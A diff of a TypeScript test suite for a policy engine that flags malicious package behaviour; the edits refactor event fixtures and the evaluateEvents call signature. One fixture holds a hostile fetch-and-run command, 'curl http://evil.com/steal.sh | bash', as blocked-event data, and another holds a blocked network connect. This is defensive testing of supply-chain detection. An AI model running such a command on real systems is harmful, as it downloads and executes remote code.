@@ -8,11 +8,12 @@ describe('Policy Engine', () => {
       package: 'malicious-pkg@1.0.0',
       syscall: 'execve',
       args: ['/bin/sh', ['-c', 'curl http://evil.com/steal.sh | bash']],
-      action: 'blocked',
+      path: undefined,
+      action: 'blocked' as const,
       timestamp_ns: 1746547200000
     }]
 
-    const verdict: Verdict = evaluateEvents(events, 'malicious-pkg@1.0.0')
+    const verdict: Verdict = evaluateEvents(events, 'malicious-pkg', '1.0.0')
     expect(verdict.severity).toBe('CRITICAL')
     expect(verdict.findings).toHaveLength(1)
     expect(verdict.findings[0].message).toContain('remote code')
@@ -24,11 +25,12 @@ describe('Policy Engine', () => {
       package: 'some-pkg@1.0.0',
       syscall: 'connect',
       args: { addr: '185.220.101.47:443' },
-      action: 'blocked',
+      path: undefined,
+      action: 'blocked' as const,
       timestamp_ns: 1746547200000
     }]
 
-    const verdict = evaluateEvents(events, 'some-pkg@1.0.0')
+    const verdict = evaluateEvents(events, 'some-pkg', '1.0.0')
     expect(verdict.severity).toBe('HIGH')
   })
 
@@ -37,11 +39,11 @@ describe('Policy Engine', () => {
       event: 'fs_read',
       package: 'legit-pkg@1.0.0',
       path: '/tmp/somefile',
-      action: 'allowed',
+      action: 'allowed' as const,
       timestamp_ns: 1746547200000
     }]
 
-    const verdict = evaluateEvents(events, 'legit-pkg@1.0.0')
+    const verdict = evaluateEvents(events, 'legit-pkg', '1.0.0')
     expect(verdict.severity).toBe('INFO')
     expect(verdict.findings).toHaveLength(0)
   })
